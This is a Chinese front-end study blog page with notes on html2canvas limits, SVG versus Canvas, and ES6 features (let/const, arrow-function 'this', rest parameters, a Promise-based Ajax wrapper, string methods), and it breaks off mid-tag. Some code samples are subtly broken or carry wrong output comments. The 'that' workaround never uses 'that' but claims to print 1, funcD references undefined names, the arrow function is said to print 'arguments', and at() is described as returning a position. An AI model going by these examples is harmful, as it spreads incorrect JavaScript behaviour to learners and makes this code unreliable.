title="html2canvas原理"></a>html2canvas原理</h2><p>它的原理是将 <code>Dom</code> 节点在 <code>Canvas</code> 里边画出来。虽然很方便，但有以下限制：</p><ul><li>不支持 <code>iframe</code></li><li>不支持跨域图片</li><li>不能在浏览器插件中使用</li><li>部分浏览器上不支持 <code>SVG</code> 图片</li><li>不支持 <code>Flash</code></li><li>不支持古代浏览器和 <code>IE</code></li></ul><hr><h2 id="SVG和Canvas的区别"><a href="#SVG和Canvas的区别" class="headerlink" title="SVG和Canvas的区别"></a>SVG和Canvas的区别</h2><h3 id="SVG"><a href="#SVG" class="headerlink" title="SVG"></a>SVG</h3><p>  SVG 是一种使用 <code>XML</code> 描述 <code>2D</code> 图形的语言。</p><ul><li>不依赖分辨率</li><li>支持事件处理器</li><li>最适合带有大型渲染区域的应用程序（比如谷歌地图）</li><li>复杂度高会减慢渲染速度（任何过度使用 <code>DOM</code> 的应用都不快）</li><li>不适合游戏应用</li></ul><h3 id="Canvas"><a href="#Canvas" class="headerlink" title="Canvas"></a>Canvas</h3><p>  Canvas 通过 <code>JavaScript</code> 来绘制 <code>2D</code> 图形。</p><ul><li>依赖分辨率，逐像素进行渲染</li><li>不支持事件处理器</li><li>弱的文本渲染能力</li><li>能够以 <code>.png</code> 或 <code>.jpg</code> 格式保存结果图像</li><li>最适合图像密集型的游戏，其中的许多对象会被频繁重绘</li></ul><p><code>Canvas</code> 通过 <code>JavaScript</code> 来绘制 <code>2D</code> 图形。<br><code>SVG</code> 是基于形状的保留模式图形系统，更加适合较大的表面或较小数量的对象。<code>Canvas</code> 和 <code>SVG</code> 在修改方式上还存在着不同。绘制 <code>Canvas</code> 对象后，不能使用脚本和 <code>CSS</code> 对它进行修改。因为 <code>SVG</code> 对象是文档对象模型的一部分，所以可以随时使用脚本和 CSS 修改它们。</p><hr><h2 id="es6常用语法"><a href="#es6常用语法" class="headerlink" title="es6常用语法"></a>es6常用语法</h2><p>let、const、模板字符串、箭头函数、字符串方法、数组方法、Promise()方法、Map、Set等</p><h3 id="let的特点"><a href="#let的特点" class="headerlink" title="let的特点"></a>let的特点</h3><ul><li>只在代码块内有效</li><li><p>不存在变量提升（只能先声明后使用）（变量提升指变量在声明之前使用，值为ReferenceError）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// var 的情况</span></span><br><span class="line"><span class="built_in">console</span>.log(foo); <span class="comment">// 输出undefined</span></span><br><span class="line"><span class="keyword">var</span> foo = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// let 的情况</span></span><br><span class="line"><span class="built_in">console</span>.log(bar); <span class="comment">// 报错ReferenceError</span></span><br><span class="line"><span class="keyword">let</span> bar = <span class="number">2</span>;</span><br></pre></td></tr></table></figure></li><li><p>不允许重复申明（不允许在相同作用域内重复声明同一个变量）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 报错</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> a = <span class="number">10</span>;</span><br><span class="line">  <span class="keyword">var</span> a = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 报错</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> a = <span class="number">10</span>;</span><br><span class="line">  <span class="keyword">let</span> a = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">func</span>(<span class="params">arg</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> arg; <span class="comment">// 报错</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">func</span>(<span class="params">arg</span>) </span>&#123;</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">let</span> arg; <span class="comment">// 不报错</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>let新增块级作用域</p></li></ul><h3 id="const的特点"><a href="#const的特点" class="headerlink" title="const的特点"></a>const的特点</h3><ul><li><p>const声明一个只读的常量，一旦声明，常量的值就不能改变</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> PI = <span class="number">3.1415</span>;</span><br><span class="line">PI <span class="comment">// 3.1415</span></span><br><span class="line"></span><br><span class="line">PI = <span class="number">3</span>;</span><br><span class="line"><span class="comment">// TypeError: Assignment to constant variable.</span></span><br></pre></td></tr></table></figure></li><li><p>const一旦声明变量，就必须立即初始化，不能等到以后赋值</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> foo;</span><br><span class="line"><span class="comment">// SyntaxError: Missing initializer in const declaration</span></span><br></pre></td></tr></table></figure></li><li><p>只在声明所在的块级作用域内有效</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> MAX = <span class="number">5</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">MAX <span class="comment">// Uncaught ReferenceError: MAX is not defined</span></span><br></pre></td></tr></table></figure></li><li><p>不存在变量提升</p></li><li>只能先声明后使用</li><li>不允许重复声明</li><li><p>对于复合类型的变量，变量名不指向数据，而是指向数据所在的地址。即const命令只是保证变量名指向的地址不变，而不是保证数据不变，所以使用const声明为常量必须小心。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> foo = &#123;&#125;;</span><br><span class="line">foo.prop = <span class="number">123</span>;</span><br><span class="line">foo.prop</span><br><span class="line"><span class="comment">// 123</span></span><br><span class="line">foo = &#123;&#125;; <span class="comment">// TypeError: "foo" is read-only</span></span><br></pre></td></tr></table></figure><p>常量foo存储的是一个地址，这个地址指向一个对象。所谓不可变的是这个地址，不能把foo指向另一个地址，但是该对象本身是可变的，可以为这个对象添加新属性等</p></li></ul><h3 id="箭头函数和普通函数的区别"><a href="#箭头函数和普通函数的区别" class="headerlink" title="箭头函数和普通函数的区别"></a>箭头函数和普通函数的区别</h3><blockquote><p>参考：<a href="https://www.jianshu.com/p/e5fe25edd78a" target="_blank" rel="noopener">简书 ES6箭头函数与普通函数的区别</a></p></blockquote><ul><li><p>this指向问题</p><p>1、普通函数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a  = <span class="number">3</span>;</span><br><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  a : <span class="number">1</span>,</span><br><span class="line">  foo : <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>, <span class="keyword">this</span>.a);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">obj.foo(); <span class="comment">// 1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> bar = obj;</span><br><span class="line">bar.a = <span class="number">2</span>;</span><br><span class="line">bar.foo(); <span class="comment">// 2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> baz = obj.foo;</span><br><span class="line">baz(); <span class="comment">// 3</span></span><br></pre></td></tr></table></figure><p>1.）直接通过 <code>obj</code> 调用其中的方法 <code>foo</code>，此时，<code>this</code> 就会指向调用 <code>foo</code> 函数的对象，也就是 <code>obj</code>;<br>2.）将 <code>obj</code> 对象赋给一个新的对象 <code>bar</code>，此时通过 <code>bar</code> 调用 <code>foo</code> 函数，<code>this</code> 的值就会指向调用者 <code>bar</code>；<br>3.）将 <code>obj.foo</code> 赋给一个新对象 <code>baz</code>，通过 <code>baz()</code> 调用 <code>foo</code> 函数，此时的 <code>this</code> 指向 <code>window</code>；</p><p>由此我们可以得出结论：</p><p>普通函数的 <code>this</code> 总是指向它的直接调用者。<br>在严格模式下，没找到直接调用者，则函数中的 <code>this</code> 是 <code>undefined</code>。<br>在默认模式下（非严格模式），没找到直接调用者，则函数中的 <code>this</code> 指向 <code>window</code>。</p><p>再考虑一下以下的情况：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  a : <span class="number">1</span>,</span><br><span class="line">  foo : <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="keyword">this</span>.a);</span><br><span class="line">    &#125;, <span class="number">3000</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line">obj.foo(); <span class="comment">//undefined</span></span><br></pre></td></tr></table></figure><p>在上例中 <code>setTimeout</code> 中的 <code>function</code> 未被任何对象调用，因此它的 <code>this</code> 指向还是 <code>window</code> 对象。</p><p>对于方法（即通过对象调用了该函数），普通函数中的 <code>this</code> 总是指向它的调用者。<br>对于一般函数，<code>this</code> 指向全局变量（非严格模式下）或者 <code>undefined</code>（严格模式下）。</p><p>假设我么需要在上例中的 <code>setTimeout</code> 中使用 <code>this</code> 要怎么做呢，在 <code>es5</code> 的时代可以这样做：<br>1.）使用一个变量 <code>that</code> 先接收一遍 <code>this</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  a : <span class="number">1</span>,</span><br><span class="line">  foo : <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> that = <span class="keyword">this</span>; <span class="comment">// 先使用一个变量接收this</span></span><br><span class="line">    setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="keyword">this</span>.a);</span><br><span class="line">    &#125;, <span class="number">3000</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line">obj.foo(); <span class="comment">// 1</span></span><br></pre></td></tr></table></figure><p>2.）使用 <code>bind</code> 给 <code>setTimeout</code> 绑定 <code>this</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  a : <span class="number">1</span>,</span><br><span class="line">  foo : <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="keyword">this</span>.a);</span><br><span class="line">    &#125;.bind(<span class="keyword">this</span>), <span class="number">3000</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line">obj.foo(); <span class="comment">// 1</span></span><br></pre></td></tr></table></figure><p>而 <code>es6</code> 可以如何实现这块呢，请继续往下看：</p><p>2、箭头函数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">() =&gt; &#123; <span class="built_in">console</span>.log(<span class="keyword">this</span>) &#125;</span><br></pre></td></tr></table></figure><p>箭头函数中没有自己的 <code>this</code>、<code>arguments</code>、<code>new target（ES6）</code>和 <code>super(ES6)</code>;<br>箭头函数相当于匿名函数，因此不能使用 <code>new</code> 来作为构造函数使用。<br>箭头函数中的 <code>this</code> 始终指向其父级作用域中的 <code>this</code>、 <code>call()</code>、 <code>bind()</code>、<code>apply()</code> 都无法改变 <code>this</code> 指向</p><p>请看如下代码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  a: <span class="number">10</span>,</span><br><span class="line">  b: <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.a); <span class="comment">// undefined</span></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>); <span class="comment">// Window &#123;postMessage: ƒ, blur: ƒ, focus: ƒ, close: ƒ, frames: Window, …&#125;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  c: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.a); <span class="comment">// 10</span></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>); <span class="comment">// &#123;a: 10, b: ƒ, c: ƒ, d: ƒ&#125;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  d: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.a); <span class="comment">// 10</span></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>); <span class="comment">// &#123;a: 10, b: ƒ, c: ƒ, d: ƒ&#125;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="keyword">this</span>.a); <span class="comment">// 10</span></span><br><span class="line">      <span class="built_in">console</span>.log(<span class="keyword">this</span>); <span class="comment">// &#123;a: 10, b: ƒ, c: ƒ, d: ƒ&#125;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;</span><br><span class="line">obj.b(); </span><br><span class="line">obj.c();</span><br><span class="line">obj.d()();</span><br></pre></td></tr></table></figure><p><code>obj.b()</code> 中的 <code>this</code> 会继承父级上下文中的 <code>this</code> 值，也就是与 <code>obj</code> 有相同的 <code>this</code> 指向，为全局变量 <code>window</code>;<br><code>obj.c()</code> 的 <code>this</code> 指向即为调用者 <code>obj</code>;<br><code>obj.d()()</code> 中的 <code>this</code> 也继承自父级上下文中的 <code>this</code>，即d的 <code>this</code> 指向，也就是 <code>obj</code>。</p></li></ul><ul><li><p>参数<br>1、示例</p><p>普通函数可以使用 <code>arguments</code> 来获取不定参数，输出的是一个数组，如</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">funcA</span>(<span class="params">a</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="built_in">arguments</span>); <span class="comment">// output: Arguments(3) [1, 2, 3, callee: ƒ, Symbol(Symbol.iterator): ƒ]</span></span><br><span class="line">&#125;</span><br><span class="line">funcA(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>);</span><br></pre></td></tr></table></figure><p><code>es6</code> 提供了 <code>rest</code> 方式来获取，即 <code>...</code> 符号，如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> funcB = <span class="function">(<span class="params">...params</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(...arguments); <span class="comment">// output: 1, 2</span></span><br><span class="line">  <span class="built_in">console</span>.log(params); <span class="comment">// output: [1, 2, 3]</span></span><br><span class="line">&#125;</span><br><span class="line">funcB(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>);</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> funcC = <span class="function">(<span class="params">a, ...params</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(params); <span class="comment">// output: [2, 3]</span></span><br><span class="line">&#125;</span><br><span class="line">funcC(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>);</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> funcC = <span class="function">(<span class="params">a, ...params, b</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(params); <span class="comment">// output: Rest parameter must be last formal parameter</span></span><br><span class="line">&#125;</span><br><span class="line">funcC(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>);</span><br></pre></td></tr></table></figure><p>2、区别：<br>1.） <code>arguments</code> 包含所有参数，<code>rest</code> 参数只包括那些没有给出名称的参数（前面的参数展示 <code>m</code> 个，<code>reset</code> 就占 <code>n - m</code> 个）<br>2.）<code>arguments</code> 对象不是真正的数组，而 <code>rest</code> 参数是数组实例，可以直接应用 <code>sort</code>、<code>map</code>、<code>forEach</code>、<code>pop</code>等方法<br>3.）将 <code>arguments</code> 转换成普通的数组</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">funcD</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="built_in">arguments</span>, args); <span class="comment">// [1, 2, callee: ƒ, Symbol(Symbol.iterator): ƒ]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> args1 = <span class="built_in">Array</span>.prototype.slice.call(<span class="built_in">arguments</span>); <span class="comment">// arguments调用Array的slice方法</span></span><br><span class="line">  <span class="keyword">var</span> args2 = <span class="built_in">Array</span>.prototype.concat.apply([], <span class="built_in">arguments</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">console</span>.log(args1, args2); <span class="comment">// [1, 2]、[1, 2]</span></span><br><span class="line">&#125;</span><br><span class="line">func(<span class="number">1</span>,<span class="number">2</span>)</span><br></pre></td></tr></table></figure></li></ul><h3 id="使用Promise自己封装一个Ajax插件"><a href="#使用Promise自己封装一个Ajax插件" class="headerlink" title="使用Promise自己封装一个Ajax插件"></a>使用Promise自己封装一个Ajax插件</h3><p>我们知道 <code>Promise</code> 会接收两个参数，<code>resolve</code> (成功)和 <code>reject</code> (失败)，我们可以用这两个参数代替 <code>ajax</code> 的 <code>success</code> 和 <code>error</code>，并使用链式调用， <code>then</code> 里面执行成功的操作，<code>catch</code>里面执行错误的信息。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> $ajax = <span class="function"><span class="keyword">function</span>(<span class="params">url, data</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="comment">// 创建 XMLHttpRequest对象,用于在后台与服务器交换数据。</span></span><br><span class="line">        <span class="keyword">let</span> request = <span class="keyword">new</span> XMLHttpRequest()</span><br><span class="line">            <span class="comment">//设置向服务器提交的方式</span></span><br><span class="line">        request.open(<span class="string">"GET"</span>, url, <span class="literal">true</span>)</span><br><span class="line">        request.responseType = <span class="string">'json'</span></span><br><span class="line">        request.setRequestHeader(<span class="string">"Accept"</span>, <span class="string">"application/json"</span>)</span><br><span class="line">        <span class="comment">// onreadystatechange捕获事件请求的状态</span></span><br><span class="line">        request.onreadystatechange = <span class="function"><span class="keyword">function</span> <span class="title">handlerRequest</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="comment">//readyState为4的时候，代表请求操作已经完成，这意味着数据传输已经彻底完成或失败。</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">this</span>.readyState === <span class="number">4</span>) &#123;</span><br><span class="line">                <span class="comment">//请求成功</span></span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">this</span>.status === <span class="number">200</span>) &#123;</span><br><span class="line">                    resolve(<span class="keyword">this</span>.response)</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    reject(<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="keyword">this</span>.statusText))</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//发送 HTTP 请求,默认异步请求</span></span><br><span class="line">        request.send(data); <span class="comment">// data的格式: name1=value1&amp;name2=value2</span></span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">$ajax(<span class="string">"http://www.phonegap100.com/appapi.php?a=getPortalList&amp;catid=20&amp;page=1"</span>, <span class="string">''</span>)</span><br><span class="line">    .then(<span class="function">(<span class="params">resolve</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(resolve)</span><br><span class="line">    &#125;)</span><br><span class="line">    .catch(<span class="function">(<span class="params">reject</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(reject)</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure></p><h3 id="常用的字符串方法"><a href="#常用的字符串方法" class="headerlink" title="常用的字符串方法"></a>常用的字符串方法</h3><ul><li><p>at(): 返回给定字符的位置</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> s = <span class="string">'Hello world!'</span>;</span><br><span class="line">s.at(<span class="number">0</span>) <span class="comment">// H</span></span><br></pre></td></tr></table></figure></li><li><p>includes(): 是否包含指定字符串，第二个参数可选，表示起始查找位置</p></li><li>startsWith(): 参数是否在头部，第二个参数可选，表示起始查找位置</li><li><p>endsWith(): 参数是否在尾部，第二个参数可选，表示起始查找位置</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> s = <span class="string">'Hello world!'</span>;</span><br><span class="line">s.startsWith(<span class="string">'Hello'</span>) <span class="comment">// true</span></span><br><span class="line">s.endsWith(<span class="string">'!'</span>) <span class="comment">// true</span></span><br><span class="line">s.includes(<span class="string">'o'</span>) <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> s = <span class="string">'Hello world!'</span>;</span><br><span class="line">s.startsWith(<span class="string">'world'</span>, <span class="number">6</span>) <span class="comment">// true</span></span><br><span class="line">s.endsWith(<span class="string">'Hello'</span>, <span class="number">5</span>) <span class="comment">// true</span></span><br><span class="line">s.includes(<span class="string">'Hello'</span>, <span class="number">6</span>) <span class="comment">// false</span></span><br></pre></td></tr></table></figure></li><li><p>repeat(): 返回重复多次后的字符串</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> s = <span class="string">'Hello'</span></span><br><span class="line">s.repeat(<span class="number">3</span>)  <span class="comment">// HelloHelloHello</span></span><br><span class="line">s.repeat(<span class="number">2.9</span>) <span class="comment">// HelloHello，参数为小数时为取整次数</span></span><br><span class="line">s.repeat(<span class="literal">Infinity</span>) <span class="comment">// 报错</span></span><br><span class="line">s.repeat(<span class="number">-1</span>) <span class="comment">// 报错</span></span><br><span class="line">s.repeat(<span class="number">-0.8</span>) <span class="comment">// ""，-1~0取整后为0</span></span><br><span class="line">s.repeat(<span class="string">"2"</span>) <span class="comment">// HelloHell0，字符串先转换成数字再取整</span></span><br><span class="line">s.repeat(<span class="string">"world"</span>) <span class="comment">// ""</span></span><br></pre></td></tr></table></figure></li><li><p>padStart(): 头部补全，第一参数表示字符串长度，第二参数可选，表示替补的字符串，如无，以空格替补</p></li><li><p>padEnd(): 尾部补全，第一参数表示字符串长度，第二参数可选，表示替补的字符串，如无，以空格替补</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> s = <span class="string">'x'</span></span><br><span class="line">s.padStart(<span class="number">5</span>, <span class="string">'ab'</span>) <span class="comment">// 'ababx'</span></span><br><span class="line">s.padStart(<span class="number">4</span>, <span class="string">'ab'</span>) <span class="comment">// 'abax'</span></span><br><span class="line">s.padStart(<span class="number">4</span>, <span class="string">'abcdefg'</span>) <span class="comment">// 'abcx' ，多余的会被去掉</span></span><br><span class="line">s.padEnd(<span class="number">5</span>, <span class="string">'ab'</span>) <span class="comment">// 'xabab'</span></span><br><span class="line">s.padEnd(<span class="number">4</span>, <span class="string">'ab'</span>) <span class="comment">// 'xaba'  </span></span><br><span class="line">s.padEnd(<span class="number">4</span>, <span class="string">'abcdefg'</span>) <span class="comment">// 'xabc' ，多余的会被去掉</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> s = <span class="string">'xxxx'</span></span><br><span class="line">s.padStart(<span class="number">2</span>, <span class="string">'ab'</span>) <span class="comment">// 'xxxx'，当设置的字符串长度小于原本长度，返回原字符串</span></span><br><span class="line">s.padEnd(<span class="number">4</span>, <span class="string">'ab'</span>) <span class="comment">// 'xxxx' ，当设置的字符串长度小于原本长度，返回原字符串</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> s = <span class="string">'x'</span></span><br><span class="line">s.padStart(<span class="number">3</span>) <span class="comment">// '  x'</span></span><br><span class="line">s.padEnd(<span class="number">4</span>) <span class="comment">//  'x   '</span></span><br><span class="line"></span><br><span class="line">常用来补全位数：</span><br><span class="line"><span 